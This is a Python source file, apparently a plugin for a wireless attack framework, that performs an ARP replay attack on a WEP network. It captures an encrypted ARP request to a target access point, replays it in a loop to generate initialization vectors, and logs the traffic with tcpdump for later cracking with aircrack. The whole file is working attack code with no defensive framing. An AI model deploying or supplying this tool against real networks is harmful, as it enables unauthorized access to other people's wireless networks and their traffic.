# -*- coding: utf-8 -*-
"""
This plugin will launch a full arp replay attack on a WEP network
You can then check the wep data log and launch aircrack on it.
"""
import os, traceback, time
from plugin import AirScannerPlugin, AirInjectorPlugin
from scapy.all import sniff, sendp, Dot11, Dot11WEP, conf, rdpcap
from subprocess import Popen
from threading import Thread, Lock
from utils.utils import DEVNULL

class ARPReplayer(AirScannerPlugin, AirInjectorPlugin):

	def __init__(self):
		super(ARPReplayer, self).__init__("arpreplayer")
		self.target_ssid = None
		self.arp_packet = None
		self.replay_thread = None
		self.tcpdump_process = None # tcpdump is used to capture packets because scapy is too slow and drops too many
		self.packet_handling_lock = Lock()
		self.packet_logger = None
		self.filename			= None
		self.sniffing_interface = self.config["sniffing_interface"]
		self.destination_folder = self.config["wep_log"]
		self.target_bssid 		= self.config["network_bssid"].lower()
		try:
			self.notification_divisor 	= int(self.config["notification_divisor"])
		except:
			self.notification_divisor 	= 2000

		self.n_captured_data_packets = 0
		self.n_arp_packets_sent = 0
		self.injection_running = False
		self.injection_working = False


	def pre_scanning(self):
		timestr = time.strftime("%Y|%m|%d-%H|%M|%S")
		self.filename = "wep_{m}_{t}.pcap".format(m = self.target_bssid, t = timestr)
		tcpdump_string = "tcpdump -i {}".format(self.sniffing_interface).split()
		tcpdump_string += ["wlan type data and (wlan addr1 {t} or wlan addr2 {t})".format(t=self.target_bssid)]
		tcpdump_string += "-w {log}".format(log = self.destination_folder + self.filename).split()

		self.tcpdump_process = Popen(tcpdump_string, stdout = DEVNULL, stderr = DEVNULL)


	def handle_packet(self, packet):
		# Identify WEP packet
		if Dot11WEP in packet:
			# Check for ARP packet if not found before
			if self.arp_packet is None:
				packet[Dot11].show
				# Identify if ARP packet by length and destination and if they are broadcast.
				if 	len(packet[Dot11WEP].wepdata) == 36 and 		\
					packet[Dot11].addr1 == self.target_bssid and	\
					packet[Dot11].addr3 == "ff:ff:ff:ff:ff:ff":

					self.arp_packet = packet
					self.injection_working = True
					self.replay_thread = Thread( target = self.arp_replay )
					self.replay_thread.start()
					print "Found a ARP request packet, trying replay attack."

			# Log WEP Data packets...
			if 	"iv" in packet[Dot11WEP].fields.keys():
				self.n_captured_data_packets += 1 	# increments count but only for comparison purposes
													# real count is from tcpdump

				if 	self.n_captured_data_packets % self.notification_divisor == 0 and \
					self.n_captured_data_packets > 0:
					n_packets = len(rdpcap(self.destination_folder + self.filename))
					self.n_captured_data_packets = n_packets
					print "Scapy captured {} wep data packets so far...".format(n_packets)

			# Evaluate if injection is working
			if self.injection_working:
				if 	self.n_arp_packets_sent > (self.n_captured_data_packets+1) * 5 and \
					self.n_arp_packets_sent > 100:

					self.injection_working = False
					self.n_arp_packets_sent = 0
					print "ARP replay was not working. Looking for new ARP packet."
					self.replay_thread.join()


	def arp_replay(self):
		if self.arp_packet is None:
			print "No ARP packet to try replay attack."
			return

		# Sppeds up scapy packet sending which is very slow.
		s = conf.L2socket(iface=self.sniffing_interface)
		self.injection_running = True
		while self.injection_working:
			try:
				s.send(self.arp_packet)
				self.n_arp_packets_sent += 1
			except: pass # No buffer space available.. skip and keep sending

		print "Stopped replay attack from last ARP packet."
		self.injection_running = False
		self.arp_packet = None
		self.n_arp_packets_sent = 0
		s.close()

	def post_scanning(self):
		self.injection_working = False

		if self.tcpdump_process != None:
			print "[+] Killing tcpdump background process"
			self.tcpdump_process.send_signal(9)  # Send SIGINT to process running tcpdum
			self.tcpdump_process = None





		